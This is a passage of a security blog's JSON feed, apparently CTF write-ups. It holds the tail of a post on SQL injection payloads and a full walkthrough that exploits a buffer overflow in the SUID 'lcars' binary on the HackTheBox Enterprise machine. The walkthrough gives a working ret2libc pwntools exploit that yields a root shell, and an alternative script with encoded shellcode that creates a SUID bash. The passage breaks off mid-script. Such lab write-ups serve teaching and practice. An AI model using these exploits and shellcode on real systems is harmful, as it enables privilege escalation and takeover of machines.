class=\"o\">=</span>1 AND <span class=\"o\">(</span>SELECT 1004 FROM <span class=\"o\">(</span>SELECT<span class=\"o\">(</span>SLEEP<span class=\"o\">(</span>5<span class=\"o\">)))</span>OoNX<span class=\"o\">)</span><span class=\"nt\">---</span><span class=\"o\">[</span>13:12:29] <span class=\"o\">[</span>INFO] the back-end DBMS is MySQL</code></pre></div></div><ul>  <li>    <table>      <tbody>        <tr>          <td>[HTB: Enterprise</td>          <td>0xdf hacks stuff - Double Query Error-based Injection](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#beyond-root—error-based-sqli)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://www.youtube.com/watch?v=NWVJ2b0D1r8&amp;t=6000s\">HTB Enterprise by Ippsec</a></li></ul><h2 id=\"htb-unattended-nested-sql-injection\">HTB Unattended nested SQL Injection</h2><p>This box is tough, I haven’t understand fully <a href=\"https://0xdf.gitlab.io/2019/08/24/htb-unattended.html#shell-as-www-data\">this</a> technique but I will put it here for reference.</p>",
            "url": "https://mvineza.github.io/spindel/2022/04/03/complicated-sql-payloads",
            
            
            
            
            
            "date_published": "2022-04-03T00:00:00+08:00",
            "date_modified": "2022-04-03T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/03/bypass-pie-32bit-ret2libc",
            "title": "Bypass PIE (32-bit) - Ret2libc",
            "summary": "Bypass PIE (32-bit) - Ret2libc",
            "content_text": "OverviewIf most stack protections are disabled except for PIE, attacker can leverage ret2libc method to do privilege escalation.Environment Setup and Requirements  SUID binary inside victim machine-rwsr-xr-x 1 root root 12152 Sep  8  2017 /bin/lcars  PIE is enabled on binary  ASLR is disabled on victim machine  DEP or NX bit is not set on binary  gdb present on victim machine  pwn tools will be used by attacker  Ghidra will be usedStepsVerify stack protections.# victim machine - ASLR is offwww-data@enterprise:/dev/shm$ cat /proc/sys/kernel/randomize_va_space 0www-data@enterprise:/dev/shm$ # attacker machine (get copy of binary) - only PIE is enabled➜  lcars checksec ./lcars    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      PIE enabled    RWX:      Has RWX segments➜  lcars .Try running binary and find the access code.  Do this inside victim machine.$ ltrace lcars# [...redacted...]strcmp(\"asas\\n\", \"picarda1\")# [...redacted...]# access code is picarda1Now that we have the access code, let’s try to fuzz the binary and see where it SEGFAULT.www-data@enterprise:/dev/shm$ lcars                 _______ _______  ______ _______          |      |       |_____| |_____/ |______          |_____ |_____  |     | |    \\_ ______|Welcome to the Library Computer Access and Retrieval SystemEnter Bridge Access Code: picarda1                 _______ _______  ______ _______          |      |       |_____| |_____/ |______          |_____ |_____  |     | |    \\_ ______|Welcome to the Library Computer Access and Retrieval SystemLCARS Bridge Secondary Controls -- Main Menu: 1. Navigation2. Ships Log3. Science4. Security5. StellaCartography6. Engineering7. ExitWaiting for input: 4Disable Security Force FieldsEnter Security Override:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[4]    111288 segmentation fault  ./lcarswww-data@enterprise:/dev/shm$ # We can see here that it segfaulted at option 4, security.Since gdb is available inside victim machine, let’s inspect the internals.(gdb) info functionsAll defined functions:Non-debugging symbols:0x00000508  _init0x00000540  strcmp@plt0x00000550  setresuid@plt0x00000560  printf@plt0x00000570  fflush@plt0x00000580  fgets@plt0x00000590  puts@plt0x000005a0  exit@plt0x000005b0  __libc_start_main@plt0x000005c0  __isoc99_scanf@plt0x000005e0  _start0x00000620  __x86.get_pc_thunk.bx0x00000630  deregister_tm_clones0x00000670  register_tm_clones0x000006c0  __do_global_dtors_aux0x00000710  frame_dummy0x0000074c  __x86.get_pc_thunk.dx0x00000750  startScreen0x000007d4  disableForcefields0x0000085e  main_menu0x00000b6a  unable0x00000ba8  bridgeAuth0x00000c91  main0x00000d30  __libc_csu_init0x00000d90  __libc_csu_fini0x00000d94  _fini(gdb) There is some functions, but its quite hard to follow.(gdb) disas main_menuDump of assembler code for function main_menu:   0x0000085e &lt;+0&gt;:\tpush   ebp   0x0000085f &lt;+1&gt;:\tmov    ebp,esp   0x00000861 &lt;+3&gt;:\tpush   ebx   0x00000862 &lt;+4&gt;:\tsub    esp,0x1a4   0x00000868 &lt;+10&gt;:\tcall   0x620 &lt;__x86.get_pc_thunk.bx&gt;   0x0000086d &lt;+15&gt;:\tadd    ebx,0x2793   0x00000873 &lt;+21&gt;:\tmov    DWORD PTR [ebp-0xd4],0x0   0x0000087d &lt;+31&gt;:\tcall   0x750 &lt;startScreen&gt;   0x00000882 &lt;+36&gt;:\tsub    esp,0xc   0x00000885 &lt;+39&gt;:\tlea    eax,[ebx-0x2113]   0x0000088b &lt;+45&gt;:\tpush   eax   0x0000088c &lt;+46&gt;:\tcall   0x590 &lt;puts@plt&gt;# [...redacted...]   0x00000b69 &lt;+779&gt;:\tret    End of assembler dump.(gdb) So let’s grab a copy and analyze the binary in Ghidra inside our attacker machine.There are multiple scaf invocations. These functions are dangerous since it doesn’t have limit on how much buffer the user can put. We are interested in option 4 since that is where the SEGFAULT happened.In Ghidra, it looks like its not calling a function,But based from 0xdf, its calling disableForcefields. Not sure why Ghidra is showing us that way but when I checked disableForcefields, it has same exact lines on what Ghidra showed us under case 4:.While investigating on this, I also tried to look for function_addr_table as 0xdf mentioned but I didnt saw it anywhere from my Ghidra output.The scanf is accepting only a buffer size of 204. This means beyond that, we can initiate the overflow.Moving along, since we have now a better look in whats the binary is doing inside, we can now proceed on finding the offset and constructing our payload. Do this inside attacker machine.# outside gdb/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 250# inside gdb# [...redacted...]Disable Security Force FieldsEnter Security Override:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2AProgram received signal SIGSEGV, Segmentation fault.0x31684130 in ?? ()# outside gdb again➜  enterprise /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31684130          [*] Exact match at offset 212➜  enterprise # EIP offset is 212Since the PIE is enabled, meaning the program code region addresses will change, we will use ret2libc method to make it easier. Our payload format would be:nop + system_addr + exit_addr + binsh_addrLet’s go back to victim machine and find the addresses using gdb.# Initialize binary(gdb) b *mainBreakpoint 1 at 0xc91(gdb) run# Find system(gdb) p system$1 = {&lt;text variable, no debug info&gt;} 0xf7e4c060 &lt;system&gt;# Find exit(gdb) p exit  $2 = {&lt;text variable, no debug info&gt;} 0xf7e3faf0 &lt;exit&gt;# Find /bin/sh# NOTE: This is part is critical, there are a lot of options#       but we need to carefully choose what to use. Since our#       program accepts accepts a string input and a newline,#       0x0a, we need to avoid 0x0a to prevent from breaking#       the payload. We can choose all others except#       0xf7f70a14. In this example, i will just choose the#       first one which is 0xf7f6ddd5.(gdb) find &amp;system,+9999999, \"sh\"                                  0xf7f6ddd50xf7f6e7e10xf7f70a140xf7f72582warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.4 patterns found.The lcars service is reachable from attacker machine, so we will use pwn tools to generate our exploit.#!/usr/bin/env python3from pwn import *# eip offset = 212system = p32(0xf7e4c060)exit = p32(0xf7e3faf0)binsh = p32(0xf7f72582)path = b\"A\"*212 + system + exit + binshr = remote(\"10.10.10.61\", 32812)r.recvuntil(\"Enter Bridge Access Code:\")r.sendline(\"picarda1\")r.recvuntil(\"Waiting for input:\")r.sendline(\"4\")r.recvuntil(\"Enter Security Override:\")r.sendline(path)r.interactive()Launchine it immediately gives us a shell as root.➜  lcars ./bof.py# [...redacted...]$ iduid=0(root) gid=0(root) groups=0(root)$ wc -c /root/root.txt33 /root/root.txt$  AlternativesHTB official walkthrough do this exploitation in another way. It didn’t use re2libc but It made use of environment variables and classic linux buffer overflow exploit sandwich:nop + shellcode + return_addrThen it runs the python script and redirect the output to a file. From there, the actual exploitation is quite odd to me:cat payload.txt | env - /bin/lcarsIt also asked to do the following commands before exploitation.unset env LINES unset env COLUMNSHere is the full python script.import struct # The below shellcode will copy /bin/bash to /tmp/writeup and chmod 4777 it # Executing it with /tmp/writeup -p will grant a root shell shellcode =  \"\" shellcode += \"\\xd9\\xee\\xbd\\x8f\\x1f\\x9f\\xe9\\xd9\\x74\\x24\\xf4\\x5f\\x29\" shellcode += \"\\xc9\\xb1\\x16\\x83\\xef\\xfc\\x31\\x6f\\x15\\x03\\x6f\\x15\\x6d\" shellcode += \"\\xea\\xf5\\xe2\\x29\\x8c\\x58\\x93\\xa1\\x83\\x3f\\xd2\\xd6\\xb4\" shellcode += \"\\x90\\x97\\x70\\x45\\x87\\x78\\xe2\\x2c\\x39\\x0e\\x01\\xfc\\x2d\" shellcode += \"\\x23\\xc5\\x01\\xae\\x27\\xb5\\x21\\x81\\xc5\\x5c\\x4c\\xf2\\x6b\" shellcode += \"\\xff\\xe3\\x64\\x4c\\xd0\\x77\\x18\\xfc\\x01\\x0f\\x90\\x95\\x29\" shellcode += \"\\x8a\\x21\\x16\\xea\\x74\\xa9\\xbe\\x61\\x1a\\x49\\x1f\\x4d\\xd3\" shellcode += \"\\xa6\\x68\\x8d\\x34\\xbd\\xfb\\xbd\\x65\\x4a\\x76\\x54\\x0e\\xd1\" shellcode += \"\\x03\\xd6\\xee\\x4e\\xbf\\x9f\\x0e\\xbd\\xbf\"addr = struct.pack('&lt;L', 0xffffdd60)padding = 212nops = \"\\x90\" * 70payload = \"picarda1\\n4\\n\"payload += nopspayload += shellcodepayload += \"A\" * (padding - len(nops) - len(shellcode))payload += addrpayload += \"\\n\"print payloadThis is similar to the first approach I tried not including the ENV stuff, but mine was not working for some reasons.References                              [HTB: Enterprise          0xdf hacks stuff](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#shell-as-root)                    ",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>If most stack protections are disabled except for PIE, attacker can leverage ret2libc method to do privilege escalation.</p><h2 id=\"environment-setup-and-requirements\">Environment Setup and Requirements</h2><ul>  <li>SUID binary inside victim machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">-rwsr-xr-x</span> 1 root root 12152 Sep  8  2017 /bin/lcars</code></pre></div></div><ul>  <li>PIE is enabled on binary</li>  <li>ASLR is disabled on victim machine</li>  <li>DEP or NX bit is not set on binary</li>  <li><code class=\"language-plaintext highlighter-rouge\">gdb</code> present on victim machine</li>  <li><code class=\"language-plaintext highlighter-rouge\">pwn</code> tools will be used by attacker</li>  <li>Ghidra will be used</li></ul><h2 id=\"steps\">Steps</h2><p>Verify stack protections.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># victim machine - ASLR is off</span>www-data@enterprise:/dev/shm<span class=\"nv\">$ </span><span class=\"nb\">cat</span> /proc/sys/kernel/randomize_va_space 0www-data@enterprise:/dev/shm<span class=\"nv\">$ </span><span class=\"c\"># attacker machine (get copy of binary) - only PIE is enabled</span>➜  lcars checksec ./lcars    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      PIE enabled    RWX:      Has RWX segments➜  lcars </code></pre></div></div><p>.Try running binary and find the access code.  Do this inside victim machine.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>ltrace lcars<span class=\"c\"># [...redacted...]</span>strcmp<span class=\"o\">(</span><span class=\"s2\">\"asas</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span>, <span class=\"s2\">\"picarda1\"</span><span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span><span class=\"c\"># access code is picarda1</span></code></pre></div></div><p>Now that we have the access code, let’s try to fuzz the binary and see where it SEGFAULT.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>www-data@enterprise:/dev/shm<span class=\"nv\">$ </span>lcars                 _______ _______  ______ _______          |      |       |_____| |_____/ |______          |_____ |_____  |     | |    <span class=\"se\">\\_</span> ______|Welcome to the Library Computer Access and Retrieval SystemEnter Bridge Access Code: picarda1                 _______ _______  ______ _______          |      |       |_____| |_____/ |______          |_____ |_____  |     | |    <span class=\"se\">\\_</span> ______|Welcome to the Library Computer Access and Retrieval SystemLCARS Bridge Secondary Controls <span class=\"nt\">--</span> Main Menu: 1. Navigation2. Ships Log3. Science4. Security5. StellaCartography6. Engineering7. ExitWaiting <span class=\"k\">for </span>input: 4Disable Security Force FieldsEnter Security Override:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class=\"o\">[</span>4]    111288 segmentation fault  ./lcarswww-data@enterprise:/dev/shm<span class=\"nv\">$ </span><span class=\"c\"># We can see here that it segfaulted at option 4, security.</span></code></pre></div></div><p>Since gdb is available inside victim machine, let’s inspect the internals.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">(</span>gdb<span class=\"o\">)</span> info functionsAll defined functions:Non-debugging symbols:0x00000508  _init0x00000540  strcmp@plt0x00000550  setresuid@plt0x00000560  <span class=\"nb\">printf</span>@plt0x00000570  fflush@plt0x00000580  fgets@plt0x00000590  puts@plt0x000005a0  <span class=\"nb\">exit</span>@plt0x000005b0  __libc_start_main@plt0x000005c0  __isoc99_scanf@plt0x000005e0  _start0x00000620  __x86.get_pc_thunk.bx0x00000630  deregister_tm_clones0x00000670  register_tm_clones0x000006c0  __do_global_dtors_aux0x00000710  frame_dummy0x0000074c  __x86.get_pc_thunk.dx0x00000750  startScreen0x000007d4  disableForcefields0x0000085e  main_menu0x00000b6a  unable0x00000ba8  bridgeAuth0x00000c91  main0x00000d30  __libc_csu_init0x00000d90  __libc_csu_fini0x00000d94  _fini<span class=\"o\">(</span>gdb<span class=\"o\">)</span> </code></pre></div></div><p>There is some functions, but its quite hard to follow.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">(</span>gdb<span class=\"o\">)</span> disas main_menuDump of assembler code <span class=\"k\">for function </span>main_menu:   0x0000085e &lt;+0&gt;:\tpush   ebp   0x0000085f &lt;+1&gt;:\tmov    ebp,esp   0x00000861 &lt;+3&gt;:\tpush   ebx   0x00000862 &lt;+4&gt;:\tsub    esp,0x1a4   0x00000868 &lt;+10&gt;:\tcall   0x620 &lt;__x86.get_pc_thunk.bx&gt;   0x0000086d &lt;+15&gt;:\tadd    ebx,0x2793   0x00000873 &lt;+21&gt;:\tmov    DWORD PTR <span class=\"o\">[</span>ebp-0xd4],0x0   0x0000087d &lt;+31&gt;:\tcall   0x750 &lt;startScreen&gt;   0x00000882 &lt;+36&gt;:\tsub    esp,0xc   0x00000885 &lt;+39&gt;:\tlea    eax,[ebx-0x2113]   0x0000088b &lt;+45&gt;:\tpush   eax   0x0000088c &lt;+46&gt;:\tcall   0x590 &lt;puts@plt&gt;<span class=\"c\"># [...redacted...]</span>   0x00000b69 &lt;+779&gt;:\tret    End of assembler dump.<span class=\"o\">(</span>gdb<span class=\"o\">)</span> </code></pre></div></div><p>So let’s grab a copy and analyze the binary in Ghidra inside our attacker machine.</p><p><img src=\"/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/31E67999-8DDB-47C7-9AD0-B5C729F144BA.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/924381DF-578B-4D2C-94FE-66D0689075C4.png\" alt=\"\" /></p><p>There are multiple <code class=\"language-plaintext highlighter-rouge\">scaf</code> invocations. These functions are dangerous since it doesn’t have limit on how much buffer the user can put. We are interested in option 4 since that is where the SEGFAULT happened.</p><p>In Ghidra, it looks like its not calling a function,</p><p><img src=\"/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/25666F20-6A4E-4650-B4E9-173E6F75A5C5.png\" alt=\"\" /></p><p>But based from <a href=\"https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#static-analysis\">0xdf</a>, its calling <code class=\"language-plaintext highlighter-rouge\">disableForcefields</code>. Not sure why Ghidra is showing us that way but when I checked <code class=\"language-plaintext highlighter-rouge\">disableForcefields</code>, it has same exact lines on what Ghidra showed us under <code class=\"language-plaintext highlighter-rouge\">case 4:</code>.</p><p><img src=\"/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/B3207A83-BCD7-46B8-BAF8-67C49C51CC36.png\" alt=\"\" /></p><p>While investigating on this, I also tried to look for <code class=\"language-plaintext highlighter-rouge\">function_addr_table</code> as 0xdf mentioned but I didnt saw it anywhere from my Ghidra output.</p><p><img src=\"/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/56A5AC4B-D1AD-4622-82A3-ADBF6919B975.png\" alt=\"\" /></p><p>The <code class=\"language-plaintext highlighter-rouge\">scanf</code> is accepting only a buffer size of 204. This means beyond that, we can initiate the overflow.</p><p>Moving along, since we have now a better look in whats the binary is doing inside, we can now proceed on finding the offset and constructing our payload. Do this inside attacker machine.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># outside gdb</span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class=\"nt\">-l</span> 250<span class=\"c\"># inside gdb</span><span class=\"c\"># [...redacted...]</span>Disable Security Force FieldsEnter Security Override:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2AProgram received signal SIGSEGV, Segmentation fault.0x31684130 <span class=\"k\">in</span> ?? <span class=\"o\">()</span><span class=\"c\"># outside gdb again</span>➜  enterprise /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class=\"nt\">-q</span> 0x31684130          <span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Exact match at offset 212➜  enterprise <span class=\"c\"># EIP offset is 212</span></code></pre></div></div><p>Since the PIE is enabled, meaning the program code region addresses will change, we will use ret2libc method to make it easier. Our payload format would be:</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>nop + system_addr + exit_addr + binsh_addr</code></pre></div></div><p>Let’s go back to victim machine and find the addresses using gdb.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Initialize binary</span><span class=\"o\">(</span>gdb<span class=\"o\">)</span> b <span class=\"k\">*</span>mainBreakpoint 1 at 0xc91<span class=\"o\">(</span>gdb<span class=\"o\">)</span> run<span class=\"c\"># Find system</span><span class=\"o\">(</span>gdb<span class=\"o\">)</span> p system<span class=\"nv\">$1</span> <span class=\"o\">=</span> <span class=\"o\">{</span>&lt;text variable, no debug info&gt;<span class=\"o\">}</span> 0xf7e4c060 &lt;system&gt;<span class=\"c\"># Find exit</span><span class=\"o\">(</span>gdb<span class=\"o\">)</span> p <span class=\"nb\">exit</span>  <span class=\"nv\">$2</span> <span class=\"o\">=</span> <span class=\"o\">{</span>&lt;text variable, no debug info&gt;<span class=\"o\">}</span> 0xf7e3faf0 &lt;<span class=\"nb\">exit</span><span class=\"o\">&gt;</span><span class=\"c\"># Find /bin/sh</span><span class=\"c\"># NOTE: This is part is critical, there are a lot of options</span><span class=\"c\">#       but we need to carefully choose what to use. Since our</span><span class=\"c\">#       program accepts accepts a string input and a newline,</span><span class=\"c\">#       0x0a, we need to avoid 0x0a to prevent from breaking</span><span class=\"c\">#       the payload. We can choose all others except</span><span class=\"c\">#       0xf7f70a14. In this example, i will just choose the</span><span class=\"c\">#       first one which is 0xf7f6ddd5.</span><span class=\"o\">(</span>gdb<span class=\"o\">)</span> find &amp;system,+9999999, <span class=\"s2\">\"sh\"</span>                                  0xf7f6ddd50xf7f6e7e10xf7f70a140xf7f72582warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.4 patterns found.</code></pre></div></div><p>The lcars service is reachable from attacker machine, so we will use pwn tools to generate our exploit.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">from</span> <span class=\"nn\">pwn</span> <span class=\"kn\">import</span> <span class=\"o\">*</span><span class=\"c1\"># eip offset = 212</span><span class=\"n\">system</span> <span class=\"o\">=</span> <span class=\"n\">p32</span><span class=\"p\">(</span><span class=\"mh\">0xf7e4c060</span><span class=\"p\">)</span><span class=\"nb\">exit</span> <span class=\"o\">=</span> <span class=\"n\">p32</span><span class=\"p\">(</span><span class=\"mh\">0xf7e3faf0</span><span class=\"p\">)</span><span class=\"n\">binsh</span> <span class=\"o\">=</span> <span class=\"n\">p32</span><span class=\"p\">(</span><span class=\"mh\">0xf7f72582</span><span class=\"p\">)</span><span class=\"n\">path</span> <span class=\"o\">=</span> <span class=\"sa\">b</span><span class=\"s\">\"A\"</span><span class=\"o\">*</span><span class=\"mi\">212</span> <span class=\"o\">+</span> <span class=\"n\">system</span> <span class=\"o\">+</span> <span class=\"nb\">exit</span> <span class=\"o\">+</span> <span class=\"n\">binsh</span><span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">remote</span><span class=\"p\">(</span><span class=\"s\">\"10.10.10.61\"</span><span class=\"p\">,</span> <span class=\"mi\">32812</span><span class=\"p\">)</span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">\"Enter Bridge Access Code:\"</span><span class=\"p\">)</span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"picarda1\"</span><span class=\"p\">)</span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">\"Waiting for input:\"</span><span class=\"p\">)</span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"s\">\"4\"</span><span class=\"p\">)</span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">recvuntil</span><span class=\"p\">(</span><span class=\"s\">\"Enter Security Override:\"</span><span class=\"p\">)</span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">sendline</span><span class=\"p\">(</span><span class=\"n\">path</span><span class=\"p\">)</span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">interactive</span><span class=\"p\">()</span></code></pre></div></div><p>Launchine it immediately gives us a shell as root.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  lcars ./bof.py<span class=\"c\"># [...redacted...]</span><span class=\"nv\">$ </span><span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span><span class=\"nv\">$ </span><span class=\"nb\">wc</span> <span class=\"nt\">-c</span> /root/root.txt33 /root/root.txt<span class=\"nv\">$ </span> </code></pre></div></div><h2 id=\"alternatives\">Alternatives</h2><p>HTB official walkthrough do this exploitation in another way. It didn’t use re2libc but It made use of environment variables and classic linux buffer overflow exploit sandwich:</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>nop + shellcode + return_addr</code></pre></div></div><p>Then it runs the python script and redirect the output to a file. From there, the actual exploitation is quite odd to me:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cat </span>payload.txt | <span class=\"nb\">env</span> - /bin/lcars</code></pre></div></div><p>It also asked to do the following commands before exploitation.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">unset env </span>LINES <span class=\"nb\">unset env </span>COLUMNS</code></pre></div></div><p>Here is the full python script.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">import</span> <span class=\"nn\">struct</span> <span class=\"c1\"># The below shellcode will copy /bin/bash to /tmp/writeup and chmod 4777 it</span> <span class=\"c1\"># Executing it with /tmp/writeup -p will grant a root shell</span> <span class=\"n\">shellcode</span> <span class=\"o\">=</span>  <span class=\"s\">\"\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\xd9\\xee\\xbd\\x8f\\x1f\\x9f\\xe9\\xd9\\x74\\x24\\xf4\\x5f\\x29</span><span class=\"s\">\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\xc9\\xb1\\x16\\x83\\xef\\xfc\\x31\\x6f\\x15\\x03\\x6f\\x15\\x6d</span><span class=\"s\">\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\xea\\xf5\\xe2\\x29\\x8c\\x58\\x93\\xa1\\x83\\x3f\\xd2\\xd6\\xb4</span><span class=\"s\">\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\x90\\x97\\x70\\x45\\x87\\x78\\xe2\\x2c\\x39\\x0e\\x01\\xfc\\x2d</span><span class=\"s\">\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\x23\\xc5\\x01\\xae\\x27\\xb5\\x21\\x81\\xc5\\x5c\\x4c\\xf2\\x6b</span><span class=\"s\">\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\xff\\xe3\\x64\\x4c\\xd0\\x77\\x18\\xfc\\x01\\x0f\\x90\\x95\\x29</span><span class=\"s\">\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\x8a\\x21\\x16\\xea\\x74\\xa9\\xbe\\x61\\x1a\\x49\\x1f\\x4d\\xd3</span><span class=\"s\">\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\xa6\\x68\\x8d\\x34\\xbd\\xfb\\xbd\\x65\\x4a\\x76\\x54\\x0e\\xd1</span><span class=\"s\">\"</span> <span class=\"n\">shellcode</span> <span class=\"o\">+=</span> <span class=\"s\">\"</span><span class=\"se\">\\x03\\xd6\\xee\\x4e\\xbf\\x9f\\x0e\\xbd\\xbf</span><span class=\"s\">\"</span><span class=\"n\">addr</span> <span class=\"o\">=</span> <span class=\"n\">struct</span><span class=\"p\">.</span><span class=\"n\">pack</span><span class=\"p\">(</span><span class=\"s\">'&lt;L'</span><span class=\"p\">,</span> <span class=\"mh\">0xffffdd60</span><span class=\"p\">)</span><span class=\"n\">padding</span> <span class=\"o\">=</span> <span class=\"mi\">212</span><span class=\"n\">nops</span> <span class=\"o\">=</span> <span class=\"s\">\"</span><span class=\"se\">\\x90</span><span class=\"s\">\"</span> <span class=\"o\">*</span> <span class=\"mi\">70</span><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"s\">\"picarda1</span><span class=\"se\">\\n</span><span class=\"s\">4</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"n\">nops</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"n\">shellcode</span><span class=\"n\">payload</span> <span class=\"o\">+=</span> <span class=\"s\">\"A\"</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"n\">padding</span> <span class=\"o\">-</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">nops</span><span 